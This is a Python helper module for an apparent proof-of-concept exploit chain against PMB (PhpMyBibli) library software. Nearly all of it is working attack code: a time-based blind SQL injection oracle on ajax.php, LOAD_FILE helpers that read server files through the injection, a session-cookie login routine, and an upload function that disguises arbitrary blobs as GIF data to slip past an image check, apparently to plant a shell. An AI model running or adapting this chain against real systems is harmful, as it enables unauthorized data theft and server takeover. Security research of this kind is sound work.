"""Shared helpers for the PMB / php2shell PoC chain.

Standard library only. Point BASE at your own target.

Target (sanitized): https://example.com
"""
import base64
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ---------------------------------------------------------------------------
# Configuration — edit these for your target
# ---------------------------------------------------------------------------
BASE = "https://example.com"
AJAX = BASE + "/ajax.php"
LOGIN_URL = BASE + "/pmb/main.php"
LOGIN_PAGE = BASE + "/pmb/index.php"
UPLOAD_URL = BASE + "/pmb/camera_upload.php"
DATABASE = "dar_alhadith"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# SQLi oracle timing
SLEEP_SECONDS = 4
SLOW_THRESHOLD = 3.5
FAST_THRESHOLD = 1.0

# A valid 1x1 GIF — used as the image-valid wrapper and as the inert cleanup blob
GIF_1X1 = (
    b"GIF89a"
    b"\x01\x00\x01\x00\x80\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x21\xF9\x04\x01\x00\x00\x00\x00"
    b"\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00"
    b"\x02\x02\x44\x01\x00\x3B"
)


def out(msg=""):
    print(msg, flush=True)


# ---------------------------------------------------------------------------
# SQL injection oracle (time-based blind)
# ---------------------------------------------------------------------------
def _fire(condition, timeout=40):
    payload = "1 AND IF(%s,SLEEP(%d),0)" % (condition, SLEEP_SECONDS)
    query = urllib.parse.urlencode({
        "categ": "storage", "datetime": "undefined", "id": payload,
        "module": "ajax", "sub": "save", "token": "undefined",
    })
    start = time.time()
    try:
        urllib.request.urlopen(
            urllib.request.Request(AJAX + "?" + query, headers={"User-Agent": UA}),
            timeout=timeout,
        ).read()
    except Exception:
        return None
    return time.time() - start


def Q(condition, tries=4):
    """Boolean oracle. One decisive sample is enough; ambiguous samples retry."""
    yes = 0
    for _ in range(tries):
        elapsed = _fire(condition)
        if elapsed is None:
            continue
        if elapsed > SLOW_THRESHOLD:
            return True
        if elapsed < FAST_THRESHOLD:
            return False
        if elapsed > 2.5:
            yes += 1
            if yes >= 2:
                return True
        else:
            return bool(yes)
    return bool(yes)


def hexlit(text):
    """Hex-encode a string literal (quotes break the endpoint)."""
    return "0x" + text.encode().hex()


def load_file(path):
    return "LOAD_FILE(%s)" % hexlit(path)


def file_exists(path):
    return Q("%s IS NOT NULL" % load_file(path))


def file_contains(path, needle):
    return Q("LOCATE(%s,%s) > 0" % (hexlit(needle), load_file(path)))


# ---------------------------------------------------------------------------
# Login / session
# ---------------------------------------------------------------------------
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def login(user, password):
    """Log in and return a cookie dict (empty on failure)."""
    data = urllib.parse.urlencode({
        "user": user, "password": password,
        "database": DATABASE, "ret_url": "",
    }).encode()
    req = urllib.request.Request(LOGIN_URL, data=data, headers={
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": LOGIN_PAGE,
    })
    opener = urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(req, timeout=30) as resp:
            raw = resp.headers.get_all("Set-Cookie") or []
    except urllib.error.HTTPError as exc:
        raw = exc.headers.get_all("Set-Cookie") or []
    except Exception:
        return {}

    cookies = {}
    for item in raw:
        pair = item.split(";")[0].split("=", 1)
        if len(pair) == 2:
            cookies[pair[0].strip()] = pair[1].strip()
    return cookies if "PhpMyBibli-SESSID" in cookies else {}


def cookie_header(cookies):
    """Build the Cookie header PMB expects from a login cookie dict."""
    sessid = cookies.get("PhpMyBibli-SESSID", "")
    parts = [
        "PhpMyBibli-LOGIN=%s" % cookies.get("PhpMyBibli-LOGIN", ""),
        "PhpMyBibli-SESSNAME=PhpMyBibli",
        "PhpMyBibli-SESSID=%s" % sessid,
        "PhpMyBibli-DATABASE=%s" % cookies.get("PhpMyBibli-DATABASE", DATABASE),
    ]
    php_sess = cookies.get("pmb%s" % sessid)
    if php_sess:
        parts.append("pmb%s=%s" % (sessid, php_sess))
    return "; ".join(parts)


# ---------------------------------------------------------------------------
# Upload (camera_upload.php)
# ---------------------------------------------------------------------------
def upload(cookies, filename, blob, as_image=True):
    """Upload a blob. Returns (status_code, body_bytes).

    as_image=True wraps the blob in a data URI so the image check passes.
    """
    if as_image:
        b64 = "data:image/gif;base64," + base64.b64encode(blob).decode()
    else:
        b64 = base64.b64encode(blob).decode()
    data = urllib.parse.urlencode({
        "upload_filename": filename, "imgBase64": b64,
    }).encode()
    req = urllib.request.Request(UPLOAD_URL, data=data, headers={
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie_header(cookies),
    })
    try:
        with urllib.request.urlopen(req, timeout=40) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()
    except Exception as exc:
        return None, str(exc).encode()


def fetch(path):
    """GET a path relative to BASE. Returns (status, body)."""
    try:
        req = urllib.request.Request(BASE + path, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()
    except Exception as exc:
        return None, str(exc).encode()


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    out("oracle true : %s" % Q("1=1"))
    out("oracle false: %s" % Q("1=2"))
